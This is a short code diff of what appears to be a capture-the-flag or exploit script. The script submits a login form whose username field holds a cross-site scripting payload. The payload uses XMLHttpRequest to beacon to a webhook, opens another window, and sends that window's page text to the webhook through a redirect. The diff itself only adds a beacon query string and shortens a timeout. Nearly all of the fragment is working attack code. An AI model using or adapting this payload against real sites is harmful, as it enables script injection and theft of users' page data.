@@ -29,7 +29,7 @@ try {
 
   const payload = `
 let xhr = new XMLHttpRequest();
-xhr.open("GET", "${WEBHOOK}", false);
+xhr.open("GET", "${WEBHOOK}?imin", false);
 xhr.send(null);
 const profile = window.open("", "${OPEN}");
 window.location = "${WEBHOOK}?" + profile.document.body.innerText;
@@ -37,7 +37,7 @@ window.location = "${WEBHOOK}?" + profile.document.body.innerText;
   document.getElementById("username").value = `<script>${payload}</script>`;
   document.getElementById("login").submit();
 
-  setTimeout(() => imgEnd(), 4000);
+  setTimeout(() => imgEnd(), 3000);
 } catch (error) {
   post(WEBHOOK, `Error: ${error}`);
 }
